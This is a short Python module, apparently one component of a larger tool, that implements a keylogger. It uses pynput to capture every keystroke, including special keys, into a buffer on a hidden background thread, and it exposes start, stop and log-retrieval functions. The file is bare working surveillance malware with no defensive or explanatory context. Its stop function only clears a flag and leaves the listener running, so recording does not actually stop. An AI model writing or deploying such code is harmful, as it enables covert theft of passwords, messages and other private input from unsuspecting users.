# modules/keylogger.py

import threading
from pynput import keyboard

log = ""
keylogger_active = False
listener_thread = None

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        else:
            log += f"[{key.name}]"

def start_keylogger():
    global keylogger_active, listener_thread
    if not keylogger_active:
        keylogger_active = True
        listener = keyboard.Listener(on_press=on_press)
        listener_thread = threading.Thread(target=listener.start, daemon=True)
        listener_thread.start()

def stop_keylogger():
    global keylogger_active
    keylogger_active = False

def get_logs():
    global log
    temp = log
    log = ""
    return temp
